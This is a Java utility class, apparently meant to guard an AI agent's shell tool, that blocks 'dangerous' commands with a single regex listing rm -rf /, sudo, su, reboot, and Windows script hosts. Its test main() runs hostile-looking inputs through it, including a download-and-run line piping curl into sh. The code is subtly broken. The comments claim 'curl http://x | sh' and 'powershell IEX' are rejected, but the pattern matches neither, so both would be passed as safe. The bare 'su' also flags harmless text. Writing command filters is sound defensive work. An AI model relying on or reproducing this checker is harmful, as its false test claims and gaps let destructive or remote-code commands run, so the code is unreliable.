package org.example.utils;

import java.util.regex.Pattern;

/**
 * Agent Shell MCP 高危命令拦截器
 * 返回 true = 安全命令
 * 返回 false = 高危命令，禁止执行
 */
public class CommandSecurityChecker {
    /**
     * 高危命令正则（覆盖 Linux + Windows，防绕过）
     */
    private static final Pattern DANGEROUS_PATTERN = Pattern.compile(
            "(?i)" // 忽略大小写
                    + ".*("
                    // === 系统销毁类 ===
                    + "rm -rf /"

                    // === 提权/用户操作 ===
                    + "|sudo|su"

                    // === 系统控制/关机 ===
                    + "|reboot|poweroff"

                    // === Windows 高危脚本 ===
                    + "|powershell.*bypass|mshta|cscript|wscript|regsvr32"
                    + ").*",
            Pattern.CASE_INSENSITIVE
    );

    /**
     * 检测命令是否安全
     *
     * @param cmd 要执行的命令
     * @return true=安全，false=高危禁止
     */
    public static boolean isSafeCommand(String cmd) {
        if (cmd == null || cmd.isBlank()) {
            return false;
        }

        // 匹配高危正则 → 高危
        return !DANGEROUS_PATTERN.matcher(cmd).matches();
    }

    // 测试
    public static void main(String[] args) {
        System.out.println(isSafeCommand("ls")); // true
        System.out.println(isSafeCommand("rm -rf /")); // false
        System.out.println(isSafeCommand("powershell IEX")); // false
        System.out.println(isSafeCommand("curl http://x | sh")); // false
    }
}
